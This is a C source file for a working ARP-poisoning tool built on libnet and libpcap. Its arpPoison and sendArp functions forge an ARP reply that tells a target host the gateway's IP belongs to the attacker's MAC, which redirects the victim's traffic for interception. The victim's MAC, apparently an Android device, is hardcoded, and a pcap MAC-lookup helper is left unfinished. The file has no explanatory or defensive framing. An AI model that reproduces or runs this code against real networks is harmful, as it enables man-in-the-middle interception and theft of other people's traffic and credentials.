

#include <stdio.h>
#include "libnet/libnetcore.h"
#include "pcap/pcap.h"

// android mac: f0:27:65:ff:de:43
u_char enet_dst[6] = {0xf0, 0x27, 0x65, 0xff, 0xde, 0x43};
/*
15:31:23.677800 ARP, Reply pp is-at 0d:0e:0a:0d:00:00 (oui Unknown), length 28
 */


struct{
    char* dev;
    libnet_t *arpMachine; 
}Settings;

void sendArp(int type, char* ipsrc, uint8_t* hwsrc, char* ipdst, uint8_t* hwdst);
int getMacAddress(char* ip){
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;      /* The compiled filter */
    char filter[50];
    sprintf(filter, "src ip %s", ip);
    char* filter_exp = filter;  /* The filter expression */
    bpf_u_int32 mask;       /* Our netmask */
    bpf_u_int32 net;        /* Our IP */
    struct pcap_pkthdr header;  /* The header that pcap gives us */
    const u_char *packet;       /* The actual packet */
    char* dev = NULL;
    dev = pcap_lookupdev(errbuf);
    if (dev == NULL) {
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        return(2);
    }
    
    printf("device is %s\n", dev);
    /* Find the properties for the device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
        net = 0;
        mask = 0;
    }
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return(2);
    }
    /* Compile and apply the filter */
    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return(2);
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return(2);
    }
    if (pcap_datalink(handle) != DLT_EN10MB) {
        fprintf(stderr, "Device %s doesn't provide Ethernet headers - not supported\n", dev);
        return(2);
    }
    /* Grab a packet */
    packet = pcap_next(handle, &header);
    /* Print its length */
    printf("Jacked a packet with length of [%d]\n", header.len);
    /* And close the session */
    pcap_close(handle);
    return 0;
}

int arpPoison(char* ipTarget, char* ipGateway){
    // Lookup ipTarget's HWAddr..

    uint8_t* hwspoof = libnet_get_hwaddr(Settings.arpMachine)->ether_addr_octet;
    // TODO replace enet_dst with lookup value
    sendArp(ARPOP_REPLY, ipGateway, hwspoof, ipTarget, enet_dst);
    return 0;
}

char ERRBUF[LIBNET_ERRBUF_SIZE];
void sendArp(int type, char* ipsrc, uint8_t* hwsrc, char* ipdst, uint8_t* hwdst){
    libnet_ptag_t t;
    libnet_t* l = Settings.arpMachine;
    int c;
    uint8_t *packet;
    uint32_t packet_s;
    struct in_addr addr_src;
    struct in_addr addr_dst;
    inet_aton(ipsrc, &addr_src);
    inet_aton(ipdst, &addr_dst);

    t = libnet_build_arp(
            ARPHRD_ETHER,   /* hardware addr */
            ETHERTYPE_IP,   /* protocol addr */
            6,              /* hardware addr size */
            4,              /* protocol addr size */
            type,    /* operation type */
            hwsrc,   /* sender hardware addr */
            (uint8_t *)&addr_src.s_addr,  /* sender protocol addr */
            hwdst,   /* target hardware addr */
            (uint8_t *)&addr_dst.s_addr,  /* target protocol addr */
            NULL,           /* payload */
            0,              /* payload size */
            l,              /* libnet context */
            0);             /* libnet id */
    if (t == -1)
    {
        fprintf(stderr, "Can't build ARP header: %s\n", libnet_geterror(l));
        return;
    }
    t = libnet_autobuild_ethernet(
            enet_dst,           /* ethernet destination */
            ETHERTYPE_ARP,      /* protocol type */
            l);                 /* libnet handle */
    if (t == -1)
    {
        fprintf(stderr, "Can't build ethernet header: %s\n",
                libnet_geterror(l));
        return;
    }


    if (libnet_adv_cull_packet(l, &packet, &packet_s) == -1)
    {
        fprintf(stderr, "%s", libnet_geterror(l));
    }
    else
    {
        fprintf(stdout, "packet size: %d\n", packet_s);
        libnet_adv_free_packet(l, packet);
    }

    c = libnet_write(l);
    if (c == -1)
    {
        fprintf(stderr, "Write error: %s\n", libnet_geterror(l));
    }
    else
    {
        fprintf(stdout, "Wrote %d byte ARP packet\n", c);
    }

   
}

int main(int argc, char* argv[]){
    if (argc<4){
        printf("usage: ./a.out <interface> <iptarget> <ipgateway>\n");
        return 1;
    }
    Settings.dev = argv[1];
    Settings.arpMachine = libnet_init(
                                LIBNET_LINK_ADV, /* injection type */
                                Settings.dev,          /* network interface */
                                ERRBUF);         /* errbuf */
   if (Settings.arpMachine == NULL){
        fprintf(stderr, "fail:%s\n", ERRBUF);
        exit(EXIT_FAILURE);
    }

    arpPoison(argv[2], argv[3]);
    libnet_destroy(Settings.arpMachine);
    return 0;
}
